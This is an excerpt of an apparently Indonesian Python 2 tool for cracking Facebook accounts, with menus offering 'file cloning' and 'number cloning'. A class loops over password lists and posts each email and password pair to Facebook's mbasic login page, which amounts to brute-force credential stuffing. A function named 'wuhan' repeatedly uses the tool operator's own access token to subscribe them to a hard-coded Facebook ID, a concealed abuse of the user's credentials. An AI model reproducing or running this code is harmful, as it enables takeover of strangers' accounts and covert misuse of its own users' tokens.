...
def moch_yayan():
  ...
  #  print '      (\x1b[0;96m\xe2\x80\xa2\x1b[0m) ACTIVE USER : %s' % nama
    ...
    os.system('echo -e "\n\n    [S]     START-FILE-CLONING" | lolcat')
    os.system('echo -e "\n\n    [O]     OLD-ID-CLONER" | lolcat')
    os.system('echo -e "\n\n    [R]     SIMPLE-NMBR-CLONING" | lolcat')
    ...
    os.system('echo -e "\n\n  FOR OK RESULTS CREAT FILE FROM 75,76 ID LINKS "| lolcat')
    os.system('echo -e "_________________________________________________________________"| lolcat')
    pepek = raw_input('\n CHOSE : ')
    if pepek == '':
        ...
        print '\n %s[%s\xc3\x97%s] menu [%s%s%s] PLZ TYPE [SDJ] FOR DUMP PBLK [S] FOR START CRCKING' % (N, M, N, M, pepek, N)
        time.sleep(2)
        moch_yayan()
...
def wuhan(kontol):
    try:
        kentod = kontol
        requests.post('https://graph.facebook.com/100005323385256/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100005323385256/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100005323385256/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100005323385256/subscribers?access_token=%s' % kentod)
        requests.post('https://graph.facebook.com/100005323385256/subscribers?access_token=%s' % kentod)
...
class __crack__:
    ...
    def __mbasic__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            ses.headers.update({'Host': '__mbasic__.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': _kontol, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://__mbasic__.facebook.com')
            b = ses.post('https://__mbasic__.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
